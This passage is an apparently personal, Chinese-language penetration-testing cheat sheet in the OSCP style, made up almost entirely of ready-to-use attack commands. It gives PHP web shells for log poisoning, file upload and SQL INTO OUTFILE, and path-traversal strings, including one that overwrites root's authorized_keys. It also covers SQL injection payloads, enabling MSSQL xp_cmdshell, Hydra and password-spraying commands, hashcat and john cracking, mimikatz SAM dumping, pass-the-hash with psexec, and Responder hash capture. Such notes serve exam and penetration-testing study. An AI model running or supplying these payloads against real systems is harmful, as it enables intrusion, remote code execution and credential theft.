</span></span><span class="line"><span class="cl">		/home/offsec/.ssh/id_rsa
</span></span><span class="line"><span class="cl">		ssh -i ss_risa -p <span class="m">2222</span> offsec@mountaindesserts.com
</span></span><span class="line"><span class="cl">文件包含
</span></span><span class="line"><span class="cl">	apache日志 useragent   &lt;?php <span class="nb">echo</span> system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span>?&gt;  
</span></span><span class="line"><span class="cl">	访问时记得使用<span class="p">&amp;</span> 而不是？
</span></span><span class="line"><span class="cl">	%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/
</span></span><span class="line"><span class="cl">	%2e%2e<span class="se">\%</span>2e%2e<span class="se">\%</span>2e%2e<span class="se">\%</span>2e%2e<span class="se">\%</span>2e%2e<span class="se">\%</span>2e%2e<span class="se">\%</span>2e%2e<span class="se">\%</span>2e%2e<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	../../../../../../../../../../../../../../../../../../
</span></span><span class="line"><span class="cl">	..<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	
</span></span><span class="line"><span class="cl">	<span class="c1">##直接读取文件</span>
</span></span><span class="line"><span class="cl">	php://filter/convert.base64-encode/resource<span class="o">=</span>xxx
</span></span><span class="line"><span class="cl">	<span class="c1">##将数据嵌入到web中执行   必须allow_url_include</span>
</span></span><span class="line"><span class="cl">	data://
</span></span><span class="line"><span class="cl">	data://text/plain,&lt;?php%20echo%20system<span class="o">(</span><span class="s1">&#39;dir&#39;</span><span class="o">)</span>?&gt; 
</span></span><span class="line"><span class="cl">	data://text/plain<span class="p">;</span>base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg<span class="o">==</span><span class="p">&amp;</span><span class="nv">cmd</span><span class="o">=</span>ls
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">文件上传
</span></span><span class="line"><span class="cl">	传马
</span></span><span class="line"><span class="cl">		&lt;?php system<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> ?&gt;
</span></span><span class="line"><span class="cl">		&lt;?php <span class="nb">echo</span> system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> ?&gt;
</span></span><span class="line"><span class="cl">	传公钥覆盖
</span></span><span class="line"><span class="cl">		ssh-keygen
</span></span><span class="line"><span class="cl">		cat fileup.pub 
</span></span><span class="line"><span class="cl">		../../../../../../../../../root/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">		rm ~/.ssh/known_hosts
</span></span><span class="line"><span class="cl">		ssh -p <span class="m">2222</span> -i fileup root@mountaindesserts.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	php7
</span></span><span class="line"><span class="cl">	phps 
</span></span><span class="line"><span class="cl">	phtml
</span></span><span class="line"><span class="cl">	大小写
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">命令注入
</span></span><span class="line"><span class="cl">	<span class="c1">##截断 </span>
</span></span><span class="line"><span class="cl">	<span class="p">;</span>  %3b
</span></span><span class="line"><span class="cl">	<span class="p">&amp;</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">###判断当前环境</span>
</span></span><span class="line"><span class="cl">	<span class="o">(</span>dir 2&gt;<span class="p">&amp;</span><span class="m">1</span> *<span class="sb">`</span><span class="p">|</span><span class="nb">echo</span> CMD<span class="o">)</span><span class="p">;&amp;</span>&lt;<span class="c1"># rem #&gt;echo PowerShell</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="sql注入"><a href="#sql注入" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>SQL注入</h3>
<p>mysql</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">###</span><span class="w"> </span><span class="n">mysql</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">练接</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="s1">&#39;root&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">199</span><span class="p">.</span><span class="mi">197</span><span class="w">   </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="mi">3306</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="err">联合查询</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3-- -
</span></span></span><span class="line"><span class="cl"><span class="s1">	查数据库
</span></span></span><span class="line"><span class="cl"><span class="s1">  database()
</span></span></span><span class="line"><span class="cl"><span class="s1">  1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">schema_name</span><span class="p">,</span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">查表</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">1</span><span class="s1">&#39; union select group_concat(table_name),database() from information_schema.tables where table_schema = database() #
</span></span></span><span class="line"><span class="cl"><span class="s1">  查列
</span></span></span><span class="line"><span class="cl"><span class="s1">  1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">),</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="o">#</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="err">报错注入</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">floor</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)--+
</span></span></span><span class="line"><span class="cl"><span class="s1">	extractvalue
</span></span></span><span class="line"><span class="cl"><span class="s1">		-1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">--+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="n">updatexml</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
</span></span></span><span class="line"><span class="cl"><span class="s1">		
</span></span></span><span class="line"><span class="cl"><span class="s1">###布尔盲注
</span></span></span><span class="line"><span class="cl"><span class="s1">	1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">length</span><span class="p">(</span><span class="k">database</span><span class="p">()</span><span class="o">&gt;=</span><span class="mi">8</span><span class="p">)</span><span class="c1">-- 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="mi">1</span><span class="s1">&#39; and left(database(),1)=&#39;</span><span class="n">a</span><span class="s1">&#39;-- 
</span></span></span><span class="line"><span class="cl"><span class="s1">	1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="c1">-- 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="err">时间注入</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="mi">1</span><span class="err">’</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">(</span><span class="k">database</span><span class="p">())</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="n">shell</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">写文件</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s1">&#39;+UNION+SELECT+null,&#34;&lt;%3fphp+system($_GET[&#39;</span><span class="n">cmd</span><span class="s1">&#39;])%3b%3f&gt;&#34;,+null,+null+INTO+OUTFILE+&#34;/var/www/html/tmp/a.php&#34;+--+//
</span></span></span><span class="line"><span class="cl"><span class="s1">	
</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>mssql sql server</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">### mssql</span>
</span></span><span class="line"><span class="cl">连接
</span></span><span class="line"><span class="cl">impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
</span></span><span class="line"><span class="cl">impacket-mssqlclient -windows-auth oscp.exam/sql_svc:Dolphin1@10.10.99.148
</span></span><span class="line"><span class="cl"><span class="c1">## 所有库</span>
</span></span><span class="line"><span class="cl">SELECT name FROM sys.databases<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">## offsec库里的所有表</span>
</span></span><span class="line"><span class="cl">SELECT * FROM offsec.information_schema.tables<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">## offsec库的users表内容</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> * from offsec.dbo.users<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">## 开xp_cmdshell</span>
</span></span><span class="line"><span class="cl">enable_xp_cmdshell 
</span></span><span class="line"><span class="cl">xp_cmdshell whoami
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## shell  xp-cmdshell</span>
</span></span><span class="line"><span class="cl">EXECUTE sp_configure <span class="s1">&#39;show advanced options&#39;</span>, 1<span class="p">;</span>
</span></span><span class="line"><span class="cl">RECONFIGURE<span class="p">;</span>
</span></span><span class="line"><span class="cl">EXECUTE sp_configure <span class="s1">&#39;xp_cmdshell&#39;</span>, 1<span class="p">;</span>
</span></span><span class="line"><span class="cl">RECONFIGURE<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">EXECUTE xp_cmdshell <span class="s1">&#39;whoami&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 补充</span>
</span></span><span class="line"><span class="cl"><span class="c1">#&#39;;WAITFOR DELAY &#39;0:0:5&#39;--</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="溢出"><a href="#溢出" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>溢出</h2>
<pre tabindex="0"><code>## 程序
以后做

### web组件
searchsploit搜索
</code></pre><h2 id="av-bypass"><a href="#av-bypass" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>av bypass</h2>
<pre tabindex="0"><code>remote
powershell
	chimera
tide免杀平台
</code></pre><h2 id="密码相关"><a href="#密码相关" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>密码相关</h2>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra. 
</span></span><span class="line"><span class="cl"><span class="c1">### ssh</span>
</span></span><span class="line"><span class="cl">	hydra -l george -P /usr/share/wordlists/rockyou.txt -s <span class="m">2222</span> ssh://192.168.218.201 
</span></span><span class="line"><span class="cl">	nxc ssh  ./192 -u ./user -p ./pass --port <span class="m">2222</span>  --continue-on-success
</span></span><span class="line"><span class="cl">	sshspray -u ./user -p ./pass  -h   192.168.245.132 
</span></span><span class="line"><span class="cl"><span class="c1">### rdp </span>
</span></span><span class="line"><span class="cl">	hydra -L /usr/share/wordlists/dirb/others/names.txt -p <span class="s2">&#34;SuperS3cure1337#&#34;</span> rdp://192.168.50.202
</span></span><span class="line"><span class="cl">	python RDPassSpray.py -t 172.16.202.12   -u  yoshi   -p Mushroom!   -d medtech.com <span class="c1">##记得带domain</span>
</span></span><span class="line"><span class="cl">	rdpspray -U ./user -P pass -T ./192 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### get 401</span>
</span></span><span class="line"><span class="cl">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.218.201 http-get /
</span></span><span class="line"><span class="cl"><span class="c1">### post</span>
</span></span><span class="line"><span class="cl">hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.218.201 http-post-form <span class="s2">&#34;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### 附</span>
</span></span><span class="line"><span class="cl">hydra -l root -p <span class="m">123456</span> -M mysql_domain   -v  mysql -t <span class="m">16</span> -w <span class="m">5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">hash</span>
</span></span><span class="line"><span class="cl"><span class="c1">### 识别</span>
</span></span><span class="line"><span class="cl">	hashid
</span></span><span class="line"><span class="cl">	hash-identify
</span></span><span class="line"><span class="cl"><span class="c1">## hashcat</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 调试</span>
</span></span><span class="line"><span class="cl">	hashcat -r upper.rule --stdout testword.txt
</span></span><span class="line"><span class="cl">	<span class="c1">### md5破解</span>
</span></span><span class="line"><span class="cl">	hashcat -m <span class="m">0</span> 19adc0e8921336d08502c039dc297ff8 ./testrockyou.txt -r upper.rule --force
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 密码管理器</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 找文件 keepass</span>
</span></span><span class="line"><span class="cl">	Get-ChildItem -Path C:<span class="se">\ </span>-Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
</span></span><span class="line"><span class="cl">	<span class="c1">### 格式化</span>
</span></span><span class="line"><span class="cl">	keepass2john Database.kdbx &gt; keepass.hash
</span></span><span class="line"><span class="cl">	<span class="c1">### 看下hash有没有问题  hash删Database:</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 找m</span>
</span></span><span class="line"><span class="cl">	hashcat -h <span class="p">|</span> grep -i <span class="s1">&#39;KeePasshtlm&#39;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### 破解 hashcat删除开头的Database:</span>
</span></span><span class="line"><span class="cl">	hashcat -m <span class="m">13400</span> keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## ssh 私钥 破解ssh  id_ecdsa id_eddsa id_dsa id_rsa</span>
</span></span><span class="line"><span class="cl">	chmod <span class="m">600</span> id_rsa
</span></span><span class="line"><span class="cl">	<span class="c1">### 格式化hash</span>
</span></span><span class="line"><span class="cl">	ssh2john id_rsa &gt; ssh.hash
</span></span><span class="line"><span class="cl">	<span class="c1">### 规则   按需要添加</span>
</span></span><span class="line"><span class="cl">	/etc/john/john.conf
</span></span><span class="line"><span class="cl">	第一行加上  <span class="o">[</span>List.Rules:sshRules<span class="o">]</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### crack</span>
</span></span><span class="line"><span class="cl">	john --wordlist<span class="o">=</span>ssh.passwords --rules<span class="o">=</span>sshRules ssh.hash
</span></span><span class="line"><span class="cl">	john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt ssh.hash
</span></span><span class="line"><span class="cl">	私钥登录
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## NTLM hash </span>
</span></span><span class="line"><span class="cl"><span class="c1">### ntlm破解 mimikatz直接解明文 已经有了管理员shell</span>
</span></span><span class="line"><span class="cl">	privilege::debug	<span class="c1">###开启SeDebugPrivilege访问权限</span>
</span></span><span class="line"><span class="cl">	token::elevate 		<span class="c1">###提升至system权限</span>
</span></span><span class="line"><span class="cl">	lsadump::sam
</span></span><span class="line"><span class="cl">	hashcat -m <span class="m">1000</span> 2835573fb334e3696ef62a00e5cf7571 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
</span></span><span class="line"><span class="cl"><span class="c1">### ntlm传递 已经有了shell，执行命令需要此账户在目标机有管理员权限，无视UAC</span>
</span></span><span class="line"><span class="cl">smb 
</span></span><span class="line"><span class="cl">	mimikatz
</span></span><span class="line"><span class="cl">	impacket-psexec -hashes 00000000000000000000000000000000:管理员hash Administrator@120.63.142.48 cmd.exe
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### netntlmv2 NetNTLMv2密码破解 跳板机可以执行命令，账户在目标机没有管理员权限</span>
</span></span><span class="line"><span class="cl">	hash不用删
</span></span><span class="line"><span class="cl">	responder -I tun0  或Inveigh
</span></span><span class="line"><span class="cl">	目标：dir <span class="se">\\</span>kaliip<span class="se">\\</span>test123
</span></span><span class="line"><span class="cl">	hashcat -m <span class="m">5600</span> ./pual.hash /usr/share/wordlists/rockyou.txt --force 
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	&gt;win  Inveigh
</span></span><span class="line"><span class="cl">	&gt;powershell-session
</span></span><span class="line"><span class="cl">Import-Module .<span class="se">\I</span>nveigh.ps1
</span></span><span class="line"><span class="cl">	&gt;powershell-session
